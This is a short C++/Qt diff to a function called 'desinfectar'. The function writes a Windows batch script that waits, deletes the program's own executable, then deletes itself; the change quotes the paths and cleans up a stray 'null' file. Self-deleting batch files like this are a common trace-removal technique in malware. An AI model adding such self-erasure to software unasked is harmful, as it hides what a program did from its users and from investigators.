@@ -512,7 +512,7 @@ void MainWindow::desinfectar()
     QFile::remove("data");
     #ifdef Q_WS_WIN
     QByteArray bat;
-    bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel " + QApplication::applicationFilePath().toLatin1() + "\ndel " + QApplication::applicationDirPath().toLatin1() + "/borrar.bat";
+    bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel \"" + QApplication::applicationFilePath().toLatin1() + "\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/null\"\ndel \"" + QApplication::applicationDirPath().toLatin1() + "/borrar.bat\"";
     bat.replace("/","\\");
     QFile archivoBat;
     archivoBat.setFileName("borrar.bat");
